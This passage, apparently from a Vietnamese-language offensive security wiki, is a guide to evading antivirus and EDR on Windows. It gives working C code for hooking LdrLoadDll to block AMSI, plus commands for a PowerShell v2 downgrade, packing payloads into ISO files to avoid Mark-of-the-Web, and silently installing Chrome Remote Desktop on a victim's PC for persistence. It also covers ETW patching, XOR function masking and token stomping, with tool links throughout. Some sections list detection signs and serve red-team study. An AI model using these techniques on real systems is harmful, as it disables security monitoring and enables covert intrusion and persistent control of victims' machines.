RESX](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml).<sup>[[51]](#references)</sup>

Các byte stub được quan sát là `41 C7 00 01 00 00 00 33 C0 C3`: chúng ghi **1** vào con trỏ kết quả trong `r8` và trả về **0** trong `eax`. Vì vậy, khẳng định được báo cáo rằng kết quả quét là `AMSI_RESULT_CLEAN` (0) đã đánh đồng giá trị trả về `S_OK` với enum đầu ra. Theo thứ tự `AMSI_RESULT` được tài liệu hóa, kết quả **1** là `AMSI_RESULT_NOT_DETECTED`; giá trị này vẫn thấp hơn ngưỡng phát hiện.<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### Chặn AMSI bằng cách ngăn amsi.dll được nạp (hook LdrLoadDll)

AMSI chỉ được khởi tạo sau khi `amsi.dll` được nạp vào tiến trình hiện tại. Một phương thức bypass mạnh, không phụ thuộc ngôn ngữ, là đặt hook user-mode lên `ntdll!LdrLoadDll` để trả về lỗi khi module được yêu cầu là `amsi.dll`. Kết quả là AMSI không bao giờ được nạp và tiến trình đó sẽ không thực hiện quét nào.<sup>[[23]](#references)</sup>

Phác thảo cách triển khai (pseudocode C/C++ x64):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Ghi chú
- Hoạt động với PowerShell, WScript/CScript và các custom loader (bất cứ thứ gì nếu không sẽ tải AMSI).
- Kết hợp với việc truyền script qua stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) để tránh các dấu vết lệnh dài.
- Đã được sử dụng bởi các loader chạy thông qua LOLBins (ví dụ: `regsvr32` gọi `DllRegisterServer`).

Công cụ **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** cũng tạo script để bypass AMSI.
Công cụ **[https://amsibypass.com/](https://amsibypass.com/)** cũng tạo script để bypass AMSI và tránh signature bằng cách ngẫu nhiên hóa hàm do người dùng định nghĩa, biến, biểu thức ký tự, đồng thời áp dụng chữ hoa/thường ngẫu nhiên cho các từ khóa PowerShell để tránh signature.

**Xóa signature bị phát hiện**

Bạn có thể dùng các công cụ như **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** và **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** để xóa signature AMSI bị phát hiện khỏi bộ nhớ của tiến trình hiện tại. Công cụ này hoạt động bằng cách quét bộ nhớ của tiến trình hiện tại để tìm signature AMSI, sau đó ghi đè bằng các lệnh NOP, qua đó xóa signature khỏi bộ nhớ.

**Các sản phẩm AV/EDR sử dụng AMSI**

Bạn có thể tìm thấy danh sách các sản phẩm AV/EDR sử dụng AMSI tại **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Sử dụng PowerShell phiên bản 2**
Nếu sử dụng PowerShell phiên bản 2, AMSI sẽ không được tải, vì vậy bạn có thể chạy script mà không bị AMSI quét. Bạn có thể làm như sau:

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell logging là tính năng cho phép ghi lại tất cả lệnh PowerShell được thực thi trên hệ thống. Tính năng này có thể hữu ích cho mục đích kiểm tra và khắc phục sự cố, nhưng cũng có thể là **vấn đề đối với attacker muốn né tránh bị phát hiện**.

Để bypass PowerShell logging, bạn có thể dùng các kỹ thuật sau:

- **Tắt PowerShell Transcription và Module Logging**: Bạn có thể dùng công cụ như [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) cho mục đích này.
- **Dùng PowerShell version 2**: Nếu dùng PowerShell version 2, AMSI sẽ không được tải, vì vậy bạn có thể chạy script mà không bị AMSI quét. Bạn có thể thực hiện việc này bằng lệnh: `powershell.exe -version 2`
- **Dùng phiên PowerShell unmanaged**: Dùng [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) để host PowerShell mà không khởi chạy `powershell.exe` (cách tiếp cận mà `powerpick` của Cobalt Strike sử dụng). Cách này né được các biện pháp kiểm soát gắn riêng với tiến trình `powershell.exe`, nhưng tự nó không vô hiệu hóa AMSI, Script Block Logging hay mọi biện pháp bảo vệ PowerShell khác; phạm vi bảo vệ phụ thuộc vào runtime và cách triển khai host.


## Obfuscation

> [!TIP]
> Một số kỹ thuật obfuscation dựa vào việc mã hóa dữ liệu, làm tăng entropy của binary và khiến AV, EDR dễ phát hiện hơn. Hãy thận trọng và có thể chỉ mã hóa những phần cụ thể trong code nhạy cảm hoặc cần được che giấu.

### Giải obfuscation các binary .NET được bảo vệ bằng ConfuserEx

Khi phân tích malware sử dụng ConfuserEx 2 (hoặc các bản fork thương mại), thường sẽ gặp nhiều lớp bảo vệ ngăn cản decompiler và sandbox. Quy trình dưới đây có thể **khôi phục IL gần như nguyên bản một cách đáng tin cậy**, sau đó có thể decompile thành C# bằng các công cụ như dnSpy hoặc ILSpy.<sup>[[10]](#references)</sup>

1.  Gỡ bỏ anti-tampering – ConfuserEx mã hóa mọi *method body* và giải mã chúng bên trong static constructor của *module* (`<Module>.cctor`). Công cụ này cũng sửa PE checksum, khiến binary bị crash nếu có bất kỳ thay đổi nào. Dùng **AntiTamperKiller** để xác định các bảng metadata đã mã hóa, khôi phục các khóa XOR và ghi lại một assembly sạch:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Output chứa 6 tham số anti-tamper (`key0-key3`, `nameHash`, `internKey`), có thể hữu ích khi xây dựng unpacker của riêng bạn.

2.  Khôi phục symbol / control-flow – đưa file *sạch* vào **de4dot-cex** (một fork của de4dot có hỗ trợ ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Cờ:
     • `-p crx` – chọn profile ConfuserEx 2
     • de4dot sẽ gỡ bỏ việc làm phẳng control-flow, khôi phục namespace, class và tên biến ban đầu, đồng thời giải mã các chuỗi hằng.

3.  Loại bỏ proxy-call – ConfuserEx thay thế các lời gọi phương thức trực tiếp bằng các wrapper nhẹ (còn gọi là *proxy call*) để tiếp tục gây khó khăn cho việc dịch ngược.  Hãy xóa chúng bằng **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Sau bước này, bạn sẽ thấy các .NET API thông thường như `Convert.FromBase64String` hoặc `AES.Create()` thay vì các hàm wrapper khó hiểu (`Class8.smethod_10`, …).

4.  Dọn dẹp thủ công – chạy binary thu được trong dnSpy, tìm các blob Base64 lớn hoặc việc sử dụng `RijndaelManaged`/`TripleDESCryptoServiceProvider` để xác định *payload* thực. Malware thường lưu payload dưới dạng mảng byte được mã hóa TLV, khởi tạo bên trong `<Module>.byte_0`.

Chuỗi bước trên khôi phục luồng thực thi **mà không cần** chạy sample độc hại – rất hữu ích khi làm việc trên workstation offline.

> 🛈  ConfuserEx tạo một custom attribute có tên `ConfusedByAttribute`, có thể dùng làm IOC để tự động phân loại sample.

#### Một dòng lệnh
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obfuscator C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Mục tiêu của dự án này là cung cấp một fork mã nguồn mở của bộ biên dịch [LLVM](http://www.llvm.org/), có khả năng tăng cường bảo mật phần mềm thông qua [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) và chống giả mạo.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator minh họa cách sử dụng ngôn ngữ `C++11/14` để tạo code obfuscated tại thời điểm biên dịch mà không cần công cụ bên ngoài và không sửa đổi compiler.
- [**obfy**](https://github.com/fritzone/obfy): Thêm một lớp các thao tác obfuscated được tạo bằng framework C++ template metaprogramming, khiến việc crack ứng dụng trở nên khó khăn hơn đôi chút.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz là một obfuscator binary x64 có thể obfuscate nhiều loại tệp PE khác nhau, bao gồm: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame là một engine mã metamorphic đơn giản dành cho các executable bất kỳ.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator là framework obfuscation code chi tiết cho các ngôn ngữ được LLVM hỗ trợ, sử dụng ROP (return-oriented programming). ROPfuscator obfuscate chương trình ở cấp mã assembly bằng cách chuyển các instruction thông thường thành chuỗi ROP, phá vỡ cách hình dung thông thường của chúng ta về luồng điều khiển.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt là một .NET PE Crypter được viết bằng Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor có thể chuyển EXE/DLL hiện có thành shellcode rồi nạp chúng

### Tự che giấu từng hàm với sự hỗ trợ của LLVM compiler

Thay vì chỉ che giấu toàn bộ implant khi nó đang ngủ, một backend LLVM X86 đã sửa đổi có thể giữ các hàm được chọn ở trạng thái XOR-masked bất cứ khi nào chúng không hoạt động. PoC Function Peekaboo chọn các tên đã được demangle có chứa `REG_`, chèn các stub đầu vào/đầu ra độc lập vị trí quanh mã máy cuối cùng, đồng thời xuất một masking handler dùng chung trong `.text`; chữ ký ở cấp mã nguồn và calling convention Windows x64 vẫn không thay đổi.<sup>[[38]](#references)[[39]](#references)</sup>

#### Chuyển đổi luồng điều khiển của backend

Thao tác này cần được thực hiện sau instruction selection và optimization vì phép biến đổi phải bao quát **mọi lệnh return được phát sinh** và xác định chính xác bố cục x86. Một `MachineFunctionPass` chạy trước bước phát sinh mã sẽ tìm `MachineInstr::isReturn()` cuối cùng, xóa nó để đường đi cuối cùng rơi vào epilogue được nối thêm, đồng thời thay các lệnh return trước đó bằng `JMP_1 handler`. Giữ lại mọi thao tác tháo stack/frame do compiler tạo ra trước mỗi lệnh return; chỉ chuyển hướng chính lệnh return đó.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` và `X86AsmPrinter::emitFunctionBodyEnd()` phát sinh các stub cho từng hàm, còn `emitEndOfAsmFile()` phát sinh handler. Các symbol được dùng chung giữa các giai đoạn phát sinh cho phép một nhánh prologue trỏ đến epilogue được phát sinh sau đó; với một lệnh `je` gần được phát sinh thủ công, hãy ghi `0F 84` theo sau bởi biểu thức MC bốn byte `target - address_after_je`. Thay vào đó, có thể phát sinh các lệnh gọi và nhảy đến handler dưới dạng đối tượng `MCInst` (`CALL64pcrel32` và `JMP_1`). Khi không chọn hàm nào và không thay đổi gì, pass phải trả về `false`; PoC trả về `true` không chính xác trong trường hợp đó.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata và khởi tạo trước CRT

PoC đặt một khóa XOR cùng các bản ghi 16 byte chứa con trỏ hàm được loader relocation và độ dài runtime trong `.funcmeta`. Mặc dù trường C là `uint32_t`, handler truy cập một QWORD tại offset `+8` của bản ghi, đọc cả độ dài lẫn phần padding, rồi tăng con trỏ bản ghi thêm `0x10`. Tên section PE chỉ có thể dài tối đa tám byte, vì vậy tra cứu runtime thấy `.funcmet`. Một patcher bên ngoài thêm `.stub` có quyền thực thi, lưu RVA entry point cũ trong stub và chuyển hướng `AddressOfEntryPoint`; PIC stub lấy image base từ `gs:[0x60]` → `[PEB+0x10]`, duyệt các import PE32+ để phân giải một `VirtualProtect` đã được import, rồi chạy trước CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Quá trình khởi tạo đặt một giá trị sentinel trong `gs:[0xE8]` rồi gọi từng hàm trong metadata. Prologue luôn ở dạng có thể đọc được sẽ ghi địa chỉ bắt đầu của hàm vào `gs:[0xF0]`, phát hiện sentinel và bỏ qua phần thân vẫn chưa được mã hóa. Sau đó, epilogue dùng `call handler`; khi handler lưu 13 register (`0x68` byte), địa chỉ trả về tại `[rsp+0x68]` chính là điểm cuối của hàm đã được biến đổi, vì vậy có thể ghi `end - start` vào bản ghi metadata của hàm. Stub xóa sentinel rồi nhảy đến `ImageBase + original_entry_point_RVA` sau khi tất cả phần thân đã được mã hóa.<sup>[[38]](#references)[[39]](#references)</sup>

Trong một lần gọi thông thường, prologue gọi cùng handler đối xứng để giải mã phần thân. Đường đi cuối cùng rơi vào epilogue được nối thêm, còn mọi lệnh return trước đó đều nhảy thẳng đến handler dùng chung. Epilogue thông thường cũng dùng `jmp handler` thay vì `call`, vì vậy sau khi mã hóa lại, lệnh `ret` của handler lấy địa chỉ trả về ban đầu của caller và giữ nguyên giá trị trả về của hàm trong `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitive che giấu và dấu hiệu phân tích

Handler tìm bản ghi hiện tại, bỏ qua prologue cố định có thể nhìn thấy (`0x46` byte trong bản build này), đổi phần còn lại thành `PAGE_EXECUTE_READWRITE`, XOR từng byte bằng byte thấp của khóa, rồi đặt lại thành `PAGE_EXECUTE_READ`. Do đó, cùng một vòng lặp sẽ giải mã khi vào hàm và mã hóa khi mỗi lần thoát bình thường.<sup>[[38]](#references)[[39]](#references)</sup>

Các dấu hiệu có độ tin cậy cao của thiết kế này gồm:<sup>[[38]](#references)[[39]](#references)</sup>

- entry point nằm trong `.stub` có quyền thực thi và section `.funcmet` chứa khóa cùng các con trỏ `.text` đã relocation;
- thao tác phân tích PEB, import table và section table trước CRT, sau đó gọi qua từng con trỏ metadata;
- các prologue PIC `call`/`pop` giống hệt nhau và nhiều điểm return được chuyển hướng đến một handler;
- các thao tác ghi vào `gs:[0xE8]`, `gs:[0xF0]` và `gs:[0xF8]`, tiếp theo là nhiều lần chuyển trạng thái `VirtualProtect` và ghi XOR từng byte vào các trang executable được ánh xạ từ image.

Đây là kỹ thuật né memory scanner, không phải bảo vệ bằng mật mã: tệp đã patch vẫn chứa phần thân gốc ở dạng rõ, và debugger có thể đặt breakpoint tại `VirtualProtect` hoặc vòng lặp XOR rồi dump hàm đang hoạt động. XOR một byte, metadata có thể đọc được và ranh giới cố định `0x46` cũng khiến việc khôi phục offline trở nên đơn giản.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Các slot TEB trong PoC là thread-local, nhưng các code page đã sửa đổi có phạm vi toàn process. Vì vậy, việc vào hàm đồng thời hoặc đệ quy có thể bật/tắt lại các instruction trong khi một lần gọi khác đang thực thi; exception và các lối thoát không cục bộ cũng có thể bỏ qua bước mã hóa lại. Một implementation vững chắc phải đồng bộ hóa các lần chuyển trạng thái, khôi phục đúng protection được trả về qua `lpflOldProtect`, tránh hard-code độ dài stub, kiểm tra cả đường đi `call` lẫn `jmp` để bảo đảm căn chỉnh stack x64, và gọi `FlushInstructionCache` sau khi ghi lại byte executable. Microsoft nêu rõ caller chịu trách nhiệm đảm bảo tính nhất quán của instruction cache khi sửa đổi mã executable.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Có thể bạn đã thấy màn hình này khi tải một số executable từ internet và chạy chúng.

Microsoft Defender SmartScreen là một cơ chế bảo mật nhằm bảo vệ người dùng cuối khỏi việc chạy các ứng dụng có khả năng độc hại.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen chủ yếu hoạt động dựa trên danh tiếng; điều đó có nghĩa là các ứng dụng ít được tải xuống sẽ kích hoạt SmartScreen, cảnh báo và ngăn người dùng cuối chạy tệp (mặc dù vẫn có thể chạy tệp bằng cách nhấp vào Xem thêm -> Vẫn chạy).

**MoTW** (Mark of The Web) là một [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) có tên Zone.Identifier, được tự động tạo khi tải tệp từ internet, kèm theo URL nơi tệp được tải xuống.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kiểm tra ADS Zone.Identifier của một tệp được tải xuống từ internet.</p></figcaption></figure>

> [!TIP]
> Điều quan trọng cần lưu ý là các executable được ký bằng chứng chỉ ký **đáng tin cậy** sẽ **không kích hoạt SmartScreen**.

Một cách rất hiệu quả để ngăn payload của bạn nhận Mark of The Web là đóng gói chúng bên trong một loại container nào đó, chẳng hạn như ISO. Điều này là do Mark-of-the-Web (MOTW) **không thể** được áp dụng cho các volume **không phải NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) là công cụ đóng gói payload vào các container đầu ra để né Mark-of-the-Web.

Ví dụ sử dụng:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Đây là bản demo bypass SmartScreen bằng cách đóng gói payload bên trong các tệp ISO bằng [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) là một cơ chế ghi log mạnh mẽ trong Windows, cho phép các ứng dụng và thành phần hệ thống **ghi log sự kiện**. Tuy nhiên, các sản phẩm bảo mật cũng có thể dùng cơ chế này để giám sát và phát hiện hoạt động độc hại.

Tương tự như cách AMSI được vô hiệu hóa (bypass), ta cũng có thể khiến hàm **`EtwEventWrite`** của tiến trình user space trả về ngay lập tức mà không ghi log sự kiện nào. Việc này được thực hiện bằng cách patch hàm trong bộ nhớ để nó trả về ngay lập tức, qua đó vô hiệu hóa ghi log ETW cho tiến trình đó.

Bạn có thể tìm hiểu thêm tại **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) và [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Việc load binary C# vào bộ nhớ đã được biết đến từ lâu và vẫn là một cách rất hiệu quả để chạy các công cụ post-exploitation mà không bị AV phát hiện.

Vì payload sẽ được load trực tiếp vào bộ nhớ mà không ghi xuống disk, ta chỉ cần lo việc patch AMSI cho toàn bộ tiến trình.

Hầu hết framework C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, v.v.) đều đã hỗ trợ thực thi trực tiếp C# assembly trong bộ nhớ, nhưng có nhiều cách khác nhau để thực hiện:

- **Fork\&Run**

Cách này **khởi chạy một tiến trình hy sinh mới**, inject mã độc post-exploitation vào tiến trình mới đó, thực thi mã độc rồi kết thúc tiến trình sau khi hoàn tất. Cách này có cả ưu điểm lẫn nhược điểm. Ưu điểm của phương pháp fork and run là việc thực thi diễn ra **bên ngoài** tiến trình Beacon implant của chúng ta. Điều này có nghĩa là nếu có sự cố trong hành động post-exploitation hoặc bị phát hiện, thì **khả năng implant tồn tại lâu hơn sẽ cao hơn nhiều.** Nhược điểm là **khả năng** bị **Behavioural Detections** phát hiện sẽ cao hơn.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Cách này inject mã độc post-exploitation **vào chính tiến trình đó**. Nhờ vậy, bạn có thể tránh phải tạo tiến trình mới và để AV scan tiến trình đó, nhưng nhược điểm là nếu payload thực thi gặp sự cố, **khả năng beacon bị mất sẽ cao hơn nhiều** vì tiến trình có thể bị crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Nếu muốn tìm hiểu thêm về việc load C# Assembly, hãy xem bài viết này [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) và InlineExecute-Assembly BOF của họ ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Bạn cũng có thể load C# Assembly **từ PowerShell**; hãy xem [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) và [video của S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Đóng gói lại công cụ .NET thành WebAssembly bằng NativeAOT (WasmForge)

Các kỹ thuật `execute-assembly` thông thường vẫn để lộ MSIL dễ nhận diện và cuối cùng khởi tạo CLR. **WasmForge** thay đổi nền tảng thực thi: nó chuyển một dự án C# sang target WASI NativeAOT-LLVM thử nghiệm, biên dịch trước thành WebAssembly và nhúng module đó vào một Windows PE host dựa trên Wazero. Tiến trình tạo ra không cần CLR, JIT hoặc `dotnet` host trên máy đích, do đó các rule chỉ dựa trên tên managed assembly, việc load CLR, AMSI hoặc .NET ETW sẽ không còn khả năng quan sát trực tiếp. Đây là kỹ thuật né tránh/đóng gói, không phải bypass ranh giới đặc quyền—guest vẫn giữ nguyên quyền hạn và hành vi OS có thể quan sát được của công cụ gốc.<sup>[[44]](#references)[[45]](#references)</sup>

### Build một dự án C#

Đường build được khuyến nghị là môi trường Docker của dự án vì môi trường này bao gồm .NET 10 SDK, NativeAOT-LLVM workload, WASI SDK 24.0, linker và các dependency để signing. Tệp `.csproj` sẽ được tự động phát hiện; lệnh build một lần sẽ thực hiện migration, vá khả năng tương thích, biên dịch WASM, tạo PE và signing.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Để khắc phục sự cố hoặc xem xét code được tạo, hãy chia quy trình thành `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` và bước cuối cùng là `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Build image cũng sử dụng wrapper `wasm-component-ld` để tránh mã hóa component WASI Preview 2 và tạo module thuần mà runtime nhúng mong đợi.<sup>[[44]](#references)[[45]](#references)</sup>

### Kết nối wasm32 C# với x64 Win32

Đây không phải là biên dịch lại mà không làm thay đổi gì. NativeAOT-WASI thiếu hoặc thay đổi các tính năng BCL hướng đến Windows, và guest wasm32 thường cấp phát các ô con trỏ bốn byte, trong khi API x64 có thể trả về con trỏ tám byte. WasmForge giải quyết cả hai vấn đề bằng các lớp được tạo sau đây:<sup>[[44]](#references)</sup>

1. Trình vá mã nguồn khắc phục các khác biệt ngữ nghĩa riêng của AOT và chuyển hướng các lệnh gọi registry, pipes, WMI, identity, directory-service, file-version, LSA và các lệnh gọi tương tự không được hỗ trợ sang các helper `Wf*`.
2. Trình quét P/Invoke tạo các ánh xạ NativeAOT `DirectPInvoke` để các lệnh gọi `[DllImport]` liên kết với các symbol cầu nối C đã được liên kết, thay vì tải động DLL được khai báo bên trong guest.
3. Các con trỏ liên kết với host sử dụng `ulong` trong C# và `uint64_t` trong C. Một dispatcher tổng quát chuyển tiếp lệnh gọi đến trình xử lý Win32 của host; `out8_mask` đánh dấu các ô đầu ra tám byte thực sự cần giữ lại nửa trên. Các đầu ra không được đánh dấu có cấu trúc wasm32 sẽ được bảo vệ bằng cơ chế chụp và khôi phục để thao tác ghi x64 không làm hỏng bốn byte liền kề.
4. Các cầu nối host chuyên dụng xử lý những thao tác không phù hợp với cơ chế dispatch syscall tổng quát, chẳng hạn như truy cập bộ nhớ đệm ticket LSA, các thao tác Kerberos/BCrypt có kết quả dạng cấu trúc, lưu lượng KDC qua TCP và các truy vấn LDAP.

Ví dụ, một wrapper cho `version.dll!VerQueryValueW` truyền bốn địa chỉ host và đặt các bit 2 và 3 (`0xC`) vì con trỏ giá trị và độ dài là các ô đầu ra tám byte. Bản thân wrapper vẫn có tính tổng quát và chuyển tên DLL, tên export, các đối số cùng mask cho `wf_call_v2`; host thực hiện chuyển đổi con trỏ và gọi API native.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Hạn chế và các hướng phát hiện

Mã sử dụng nhiều reflection, tải assembly động, callback native tùy ý và cấu trúc x64 phức tạp được trả về bộ nhớ WASM vẫn có thể cần bản vá riêng cho từng công cụ hoặc hoàn toàn không chạy được. Socket WASI Preview 2 generic cũng có thể gọi đến các stub không làm gì, vì vậy các công cụ được hỗ trợ sử dụng host shim dành riêng cho từng giao thức. Hãy kiểm tra từng lệnh với bản dựng native thay vì mặc định rằng các tính năng tương đương nhau.<sup>[[44]](#references)[[45]](#references)</sup>

Kỹ thuật này chuyển hướng telemetry chứ không làm payload trở nên vô hình. Hoạt động phát hiện có thể chuyển sang tìm PE chứa hoặc tạo module WASM, hành vi của runtime tương tự Wazero, việc cấp phát và sao chép bộ nhớ host/guest bất thường, điều phối Win32 trực tiếp generic, bất thường về chữ ký và tài nguyên PE, cùng các lệnh gọi API và lưu lượng mạng phát sinh. Vì vậy, không nên xem việc không có sự kiện tải CLR, AMSI hoặc .NET ETW là bằng chứng cho thấy tiến trình vô hại.<sup>[[44]](#references)</sup>

## Sử dụng các ngôn ngữ lập trình khác

Như đề xuất trong [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), có thể thực thi mã độc bằng các ngôn ngữ khác bằng cách cấp cho máy bị xâm nhập quyền truy cập **vào môi trường interpreter được cài đặt trên SMB share do Attacker kiểm soát**.

Bằng cách cho phép truy cập vào các Interpreter Binary và môi trường trên SMB share, bạn có thể **thực thi mã tùy ý bằng các ngôn ngữ này trong bộ nhớ** của máy bị xâm nhập.

Repo cho biết: Defender vẫn quét các script, nhưng bằng cách sử dụng Go, Java, PHP, v.v., chúng ta có **nhiều khả năng linh hoạt hơn để bypass chữ ký tĩnh**. Các thử nghiệm với những script reverse shell ngẫu nhiên chưa được obfuscate bằng các ngôn ngữ này đã thành công.

## Tái lưu trữ WebAssembly để né tránh phân tích tĩnh

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping thao túng access token của một sản phẩm bảo mật như EDR hoặc AV. Giảm các quyền của token có thể khiến tiến trình tiếp tục chạy nhưng không thể thực hiện các hành động kiểm tra hoặc khắc phục cần quyền cao.

Để ngăn việc này, Windows có thể **ngăn các tiến trình bên ngoài** lấy handle đến token của các tiến trình bảo mật.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Sử dụng phần mềm đáng tin cậy

### Chrome Remote Desktop

Như mô tả trong [**bài blog này**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), bạn có thể dễ dàng triển khai Chrome Remote Desktop trên PC của nạn nhân, sau đó dùng nó để chiếm quyền kiểm soát và duy trì persistence:<sup>[[35]](#references)</sup>
1. Tải xuống từ https://remotedesktop.google.com/, nhấp vào "Set up via SSH", sau đó nhấp vào tệp MSI dành cho Windows để tải tệp MSI xuống.
2. Chạy trình cài đặt ở chế độ im lặng trên máy nạn nhân (cần quyền admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Quay lại trang Chrome Remote Desktop và nhấp vào Next. Trình hướng dẫn sẽ yêu cầu bạn cấp quyền; nhấp vào nút Authorize để tiếp tục.
4. Chạy lệnh được cung cấp với các điều chỉnh cần thiết: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (tham số `--pin` đặt mã PIN mà không cần dùng GUI).
 

## Né tránh nâng cao

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

